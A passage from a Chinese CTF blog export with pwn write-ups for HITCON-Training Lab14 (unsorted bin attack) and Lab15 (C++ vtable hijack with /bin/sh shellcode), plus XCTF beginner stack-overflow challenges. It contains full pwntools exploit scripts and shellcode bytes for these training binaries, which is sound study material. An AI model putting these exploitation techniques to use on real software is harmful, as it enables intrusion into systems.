class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>我们需要利用这个堆溢出漏洞，完成bss段修改的需求。最容易想到的方法应该是直接构造unlink利用。</p>\n<p>该题由于提示用unsorted bin attack，unsorted bin attack的利用效果是将任意地址的数修改为一个很大的数，看起来似乎没有什么用，但也至少有如下两个利用场景：</p>\n<ul>\n<li>我们通过修改循环的次数来使得程序可以执行多次循环。</li>\n<li>我们可以修改 heap 中的 global_max_fast 来使得更大的 chunk 可以被视为 fast bin，这样我们就可以去执行一些 fast bin attack 了。</li>\n</ul>\n<p>具体的原理可以去CTF Wiki上看（<a href=\"https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack/\" target=\"_blank\" rel=\"noopener\">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack/</a>）</p>\n<p>我们使用堆溢出，修改相邻的位于unsorted bin中的chunk的bk字段，指向我们想要修改的地址 - 0x10。由于unsorted bin是FIFO，我们只需要malloc一次，就能将目标地址的数修改为main_arena+offset的地址，即一个远远大于0x1305的数，也就实现了利用。</p>\n<p>exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/x86_64-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./magicheap\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./magicheap\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">create</span><span class=\"params\">(size, content)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Heap : \"</span>)</span><br><span class=\"line\">\tp.sendline(str(size))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"heap:\"</span>)</span><br><span class=\"line\">\tp.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span><span class=\"params\">(index, size, content)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Index :\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Heap : \"</span>)</span><br><span class=\"line\">\tp.sendline(str(size))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"heap : \"</span>)</span><br><span class=\"line\">\tp.sendline(content)</span><br><span class=\"line\">\tp.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Index :\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\">create(<span class=\"number\">0x10</span>, <span class=\"string\">\"a\"</span>)</span><br><span class=\"line\">create(<span class=\"number\">0x80</span>, <span class=\"string\">\"b\"</span>)</span><br><span class=\"line\">create(<span class=\"number\">0x10</span>, <span class=\"string\">\"c\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">addr = <span class=\"number\">0x6020c0</span> - <span class=\"number\">0x10</span></span><br><span class=\"line\">payload = <span class=\"string\">\"a\"</span> * <span class=\"number\">0x10</span> + p64(<span class=\"number\">0x20</span>) + p64(<span class=\"number\">0x91</span>) + <span class=\"string\">\"aaaaaaaa\"</span> + p64(addr)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>, len(payload), payload)</span><br><span class=\"line\">create(<span class=\"number\">0x80</span>, <span class=\"string\">\"d\"</span>) </span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab15——zoo\"><a href=\"#Lab15——zoo\" class=\"headerlink\" title=\"Lab15——zoo\"></a>Lab15——zoo</h2><h3 id=\"防护-5\"><a href=\"#防护-5\" class=\"headerlink\" title=\"防护\"></a>防护</h3><p>该题没有开启NX和PIE，只有canary。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab15$ checksec zoo</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab15/zoo&apos;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX disabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br><span class=\"line\">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-5\"><a href=\"#分析-5\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>该题是C++编写的。首先会读入0x64bytes到全局变量nameofzoo。</p>\n<h4 id=\"adddog\"><a href=\"#adddog\" class=\"headerlink\" title=\"adddog\"></a>adddog</h4><p>要求输入name和weight，然后new一个0x28的dog对象，调用构造函数初始化，然后向animallist这个vector中插入当前dog对象。</p>\n<p>逆向可得Dog类的结构如下：有两个成员函数和两个成员变量，存储name和weight。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Dog</span> :</span> Animal&#123;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">speak</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">info</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> name[<span class=\"number\">24</span>];<span class=\"comment\">// + 8</span></span><br><span class=\"line\">\t<span class=\"keyword\">long</span> weight; <span class=\"comment\">// + 32</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>其中成员函数指向rodata段的vtable。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.rodata:0000000000403130 `vtable for&apos;Dog dq 0                    ; offset to this</span><br><span class=\"line\">.rodata:0000000000403138                 dq offset `typeinfo for&apos;Dog</span><br><span class=\"line\">.rodata:0000000000403140 off_403140      dq offset Dog::speak(void)</span><br><span class=\"line\">.rodata:0000000000403140                                         ; DATA XREF: Dog::Dog(std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;,int)+1F↑o</span><br><span class=\"line\">.rodata:0000000000403148                 dq offset Dog::info(void)</span><br><span class=\"line\">.rodata:0000000000403150                 public `vtable for&apos;Animal ; weak</span><br></pre></td></tr></table></figure>\n<p>Dog的构造函数中存在堆溢出漏洞，由于直接使用strcpy。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">unsigned</span> __<span class=\"function\">int64 <span class=\"title\">adddog</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  __int64 dog; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> weight; <span class=\"comment\">// [rsp+Ch] [rbp-74h]</span></span><br><span class=\"line\">  __int64 v3; <span class=\"comment\">// [rsp+10h] [rbp-70h]</span></span><br><span class=\"line\">  __int64 v4; <span class=\"comment\">// [rsp+18h] [rbp-68h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> v5; <span class=\"comment\">// [rsp+20h] [rbp-60h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> name; <span class=\"comment\">// [rsp+40h] [rbp-40h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int64 v7; <span class=\"comment\">// [rsp+68h] [rbp-18h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v7 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::__cxx11::basic_string&lt;<span class=\"keyword\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"keyword\">char</span>&gt;,<span class=\"built_in\">std</span>::allocator&lt;<span class=\"keyword\">char</span>&gt;&gt;::basic_string(&amp;v5);</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::<span class=\"keyword\">operator</span>&lt;&lt;&lt;<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"keyword\">char</span>&gt;&gt;(&amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span>, <span class=\"string\">\"Name : \"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::<span class=\"keyword\">operator</span>&gt;&gt;&lt;<span class=\"keyword\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"keyword\">char</span>&gt;,<span class=\"built_in\">std</span>::allocator&lt;<span class=\"keyword\">char</span>&gt;&gt;(&amp;edata, &amp;v5);</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::<span class=\"keyword\">operator</span>&lt;&lt;&lt;<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"keyword\">char</span>&gt;&gt;(&amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span>, <span class=\"string\">\"Weight : \"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::istream::<span class=\"keyword\">operator</span>&gt;&gt;(&amp;edata, &amp;weight);</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::__cxx11::basic_string&lt;<span class=\"keyword\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"keyword\">char</span>&gt;,<span class=\"built_in\">std</span>::allocator&lt;<span class=\"keyword\">char</span>&gt;&gt;::basic_string(&amp;name, &amp;v5);</span><br><span class=\"line\">  dog = <span class=\"keyword\">operator</span> <span class=\"keyword\">new</span>(<span class=\"number\">0x28</span>uLL);</span><br><span class=\"line\">  Dog::Dog(dog, (__int64)&amp;name, weight);</span><br><span class=\"line\">  v4 = dog;</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::__cxx11::basic_string&lt;<span class=\"keyword\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"keyword\">char</span>&gt;,<span class=\"built_in\">std</span>::allocator&lt;<span class=\"keyword\">char</span>&gt;&gt;::~basic_string(&amp;name);</span><br><span class=\"line\">  v3 = v4;</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::<span class=\"built_in\">vector</span>&lt;Animal *,<span class=\"built_in\">std</span>::allocator&lt;Animal *&gt;&gt;::push_back(&amp;animallist, &amp;v3);</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::__cxx11::basic_string&lt;<span class=\"keyword\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"keyword\">char</span>&gt;,<span class=\"built_in\">std</span>::allocator&lt;<span class=\"keyword\">char</span>&gt;&gt;::~basic_string(&amp;v5);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v7;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"addcat\"><a href=\"#addcat\" class=\"headerlink\" title=\"addcat\"></a>addcat</h4><p>和adddog完全一样，只不过new的是cat对象，同样push_back到animallist中。</p>\n<h4 id=\"listen\"><a href=\"#listen\" class=\"headerlink\" title=\"listen\"></a>listen</h4><p>首先检查animallist的size是否为0，是则直接退出。然后若index合法，则直接调用相应animal的speak函数。这里不难想到，如果我们可以劫持vtable，也就可以劫持控制流了。</p>\n<h4 id=\"show-1\"><a href=\"#show-1\" class=\"headerlink\" title=\"show\"></a>show</h4><p>同上，也是调用对象的成员函数。打印出对象的name和info字段。</p>\n<h4 id=\"remove\"><a href=\"#remove\" class=\"headerlink\" title=\"remove\"></a>remove</h4><p>首先delete掉animallist上对应index的对象，然后erase掉vector上相应项。</p>\n<h3 id=\"利用-4\"><a href=\"#利用-4\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>这里主要的难点是获取覆盖虚表指针的偏移，可以用gdb调试获得。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  x/32gx 0x0000000001263c20</span><br><span class=\"line\">0x1263c20:\t0x0000000000403140\t0x0000000031676f64</span><br><span class=\"line\">0x1263c30:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x1263c40:\t0x0000000000000028\t0x0000000000000021</span><br><span class=\"line\">0x1263c50:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x1263c60:\t0x0000000000000000\t0x0000000000000031</span><br><span class=\"line\">0x1263c70:\t0x0000000000403140\t0x0000000032676f64</span><br><span class=\"line\">0x1263c80:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x1263c90:\t0x0000000000000028\t0x0000000000000021</span><br><span class=\"line\">0x1263ca0:\t0x0000000001263c20\t0x0000000001263c70</span><br><span class=\"line\">0x1263cb0:\t0x0000000000000000\t0x0000000000020351</span><br><span class=\"line\">0x1263cc0:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x1263cd0:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x1263ce0:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x1263cf0:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x1263d00:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x1263d10:\t0x0000000000000000\t0x0000000000000000</span><br></pre></td></tr></table></figure>\n<p>可以看到0x1263c70处是要覆盖的虚表地址，而我们是从0x1263c28处开始写，所以需要padding 9 * 0x8 bytes。</p>\n<p>直接在读入zooname时在bss段布置好shellcode和fake vtable，最后直接覆盖vtable即可。</p>\n<p>完整exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/x86_64-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./zoo\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./zoo\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">adddog</span><span class=\"params\">(name, weight)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Name : \"</span>)</span><br><span class=\"line\">\tp.sendline(name)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Weight : \"</span>)</span><br><span class=\"line\">\tp.sendline(str(weight))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">addcat</span><span class=\"params\">(name, weight)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Name : \"</span>)</span><br><span class=\"line\">\tp.sendline(name)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Weight : \"</span>)</span><br><span class=\"line\">\tp.sendline(str(weight))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">listen</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"animal : \"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"4\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"animal : \"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">remove</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"5\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"animal : \"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\">shellcode = <span class=\"string\">\"\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendafter(<span class=\"string\">\"Name of Your zoo :\"</span>, shellcode + p64(<span class=\"number\">0x605420</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">adddog(<span class=\"string\">\"dog1\"</span>, <span class=\"number\">40</span>)</span><br><span class=\"line\">adddog(<span class=\"string\">\"dog2\"</span>, <span class=\"number\">40</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">remove(<span class=\"number\">0</span>)</span><br><span class=\"line\">adddog(<span class=\"string\">\"a\"</span> * <span class=\"number\">0x8</span> * <span class=\"number\">9</span> + p64(<span class=\"number\">0x605420</span> + len(shellcode)),<span class=\"number\">40</span>)</span><br><span class=\"line\">listen(<span class=\"number\">0</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n","text":"Lab10——hacknote防护可以看到本题开启了canary和nx，这时想在栈上进行利用就相当困难了。1<br>2<br>3<br>4<br>5<br>6<br>7<br>liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab10$ checkse","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"pwn","slug":"pwn","count":3,"path":"api/tags/pwn.json"}]},{"title":"攻防世界刷题——新手练习","slug":"攻防世界刷题——新手练习","date":"2019-03-20T08:15:35.000Z","updated":"2019-03-20T08:23:38.000Z","comments":true,"path":"api/articles/攻防世界刷题——新手练习.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"新手练习\"><a href=\"#新手练习\" class=\"headerlink\" title=\"新手练习\"></a>新手练习</h1><h2 id=\"when-did-you-born\"><a href=\"#when-did-you-born\" class=\"headerlink\" title=\"when_did_you_born\"></a>when_did_you_born</h2><p>gets(&amp;v4)处存在栈溢出，覆盖掉v5，为1926(0x786)即可。</p>\n<p>v4 = rsp+0x0; v5 = rsp + 0x8; 所以偏移为0x8</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __<span class=\"function\">fastcall <span class=\"title\">main</span><span class=\"params\">(__int64 a1, <span class=\"keyword\">char</span> **a2, <span class=\"keyword\">char</span> **a3)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  __int64 result; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> v4; <span class=\"comment\">// [rsp+0h] [rbp-20h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> v5; <span class=\"comment\">// [rsp+8h] [rbp-18h]</span></span><br><span class=\"line\">  ...</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"What's Your Birth?\"</span>);</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">\"%d\"</span>, &amp;v5);</span><br><span class=\"line\">  ...</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"What's Your Name?\"</span>);</span><br><span class=\"line\">    gets(&amp;v4);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"You Are Born In %d\\n\"</span>, v5);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v5 == <span class=\"number\">1926</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">\"You Shall Have Flag.\"</span>);</span><br><span class=\"line\">      system(<span class=\"string\">\"cat flag\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">\t...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\"><span class=\"comment\"># p = process(\"./when_did_you_born\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"111.198.29.45\"</span>, <span class=\"number\">31452</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"What's Your Birth?\\n\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"123\"</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"What's Your Name?\\n\"</span>)</span><br><span class=\"line\">payload = <span class=\"string\">\"a\"</span> * <span class=\"number\">8</span> + <span class=\"string\">\"\\x86\\x07\"</span></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"hello-pwn\"><a href=\"#hello-pwn\" class=\"headerlink\" title=\"hello_pwn\"></a>hello_pwn</h2><p>该题跟上一题类似，也是溢出，不过是溢出全局变量。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __<span class=\"function\">fastcall <span class=\"title\">main</span><span class=\"params\">(__int64 a1, <span class=\"keyword\">char</span> **a2, <span class=\"keyword\">char</span> **a3)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  alarm(<span class=\"number\">0x3C</span>u);</span><br><span class=\"line\">  setbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0L</span>L);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"~~ welcome to ctf ~~     \"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"lets get helloworld for bof\"</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;unk_601068, <span class=\"number\">0x10</span>uLL);</span><br><span 